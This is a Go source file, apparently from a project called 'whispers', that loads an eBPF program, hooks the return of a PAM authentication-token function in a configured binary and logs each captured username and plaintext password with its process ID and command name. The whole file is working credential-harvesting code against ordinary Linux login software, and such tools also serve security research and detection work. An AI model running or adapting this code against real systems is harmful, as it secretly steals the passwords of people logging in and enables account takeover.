package whispers

import (
	"context"
	"errors"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"

	"github.com/peter-mcconnell/whispers/pkg/config"
)

//go:generate ../../gen.sh

func Listen(_ context.Context, cfg *config.Config) error {
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	objs := bpfObjects{}
	if err := loadBpfObjects(&objs, nil); err != nil {
		return err
	}
	defer func() {
		log.Println("closing objs")
		objs.Close()
	}()

	ex, err := link.OpenExecutable(cfg.BinPath)
	if err != nil {
		return err
	}

	up, err := ex.Uretprobe(cfg.Symbol, objs.TracePamGetAuthtok, nil)
	if err != nil {
		return err
	}
	defer up.Close()

	log.Printf("Listening for events..")

	rb, err := ringbuf.NewReader(
		objs.Rb,
	)
	if err != nil {
		log.Printf("failed to open ring buffer reader: %v", err)
	}
	defer func() {
		log.Println("closing ring buffer")
		rb.Close()
	}()

	go func() {
		var record ringbuf.Record
		for {
			log.Println("reading ringbuffer")
			record, err = rb.Read()
			if err != nil {
				if errors.Is(err, ringbuf.ErrClosed) {
					log.Println("The ring buffer was closed, likely because the program is exiting.")
					return
				}
				log.Printf("error reading from ring buffer: %v", err)
				continue
			}

			event := parseEventData(record.RawSample)
			if event == nil {
				log.Println("Failed to parse event data. Printing raw data:")
				log.Println(string(record.RawSample))
				continue
			}

			log.Printf("Event: PID: %d, Comm: %s, Username: %s, Password: %s",
				event.Pid,
				byteArrayToString(event.Comm[:]),
				byteArrayToString(event.Username[:]),
				byteArrayToString(event.Password[:]))
		}
	}()

	<-stopper
	log.Println("Received signal, exiting program..")

	return rb.Close()
}
